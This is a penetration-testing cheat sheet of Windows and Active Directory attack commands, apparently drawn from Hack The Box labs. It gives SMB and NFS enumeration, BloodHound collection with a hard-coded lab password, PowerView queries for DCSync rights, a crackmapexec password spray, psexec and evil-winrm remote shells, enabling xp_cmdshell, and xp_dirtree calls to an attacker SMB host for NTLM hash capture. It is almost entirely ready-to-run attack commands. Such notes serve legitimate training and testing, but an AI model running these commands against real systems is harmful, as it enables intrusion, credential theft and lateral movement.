# Windows Recon & Attack
## Enumeration
### Common
```bash
smbmap -H <IP or hostname> -u null # Test for null access

bloodhound-python -d sequel.htb -u sql_svc -p 'WqSZAF6CysDQbGb3' -dc dc01.sequel.htb -gc dc01.sequel.htb -ns 10.10.11.51 -c all
```
### Scans
```bash
sudo nmap -p- -sC -sV $IP --open -oA scans/nmap_Initial
```

### Uncredentialed
List Shares
```bash
smbclient -L \\\\<IP or hostname> 
```
smbmap
```bash
smbmap -H <IP or hostname> -u null # Test for null access
```
Enumerate NFS Shares
```bash
/usr/sbin/showmount -e <IP>
```
Connect to NFS Shares
```bash
sudo mount -t nfs IP:share /tmp/mount/ -nolock
```
### Credentialed
CME
```bash
crackmapexec smb 10.10.10.178 -u TempUser -p welcome2019 --shares
```
smbmap
```bash
smbmap -H <IP or Hostname> -u <user> -p <password>
```
smbclient
```bash
smbclient -U <user> //<host or ip>/<share> <password>
```
Bloodhound-Python
```bash
bloodhound-python -d sequel.htb -u sql_svc -p 'WqSZAF6CysDQbGb3' -dc dc01.sequel.htb -gc dc01.sequel.htb -ns 10.10.11.51 -c all
```
PowerView/Sharpview
```powershell
#Get all users without a blank description field
Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null}

#Get all all users with DCSync
$dcsync = Get-ObjectACL "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value
Convert-SidToName $dcsync
```
### Password Spray
CME
```bash
crackmapexec smb 10.10.10.178 -u Usernames.txt -p 'welcome2019' --local-auth --continue-on-success
```
## Remote Shell
### Impacket
Impacket-psexec
```bash
impacket-psexec <user>:<password>@<IP>
```
### Evil-WinRM
```bash
evil-winrm -u <user> -p <password> -i <host or ip>
```
## Attack
### SQL
xp_cmdshell
```powershell
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'
```
Hash Stealing with xp_subdris or xp_dirtree  
Start Responder on Attack machine
```powershell
EXEC master..xp_dirtree '\\10.10.110.17\share\'
or
EXEC master..xp_subdirs '\\10.10.110.17\share\'
#Collect hashes from Responder
```

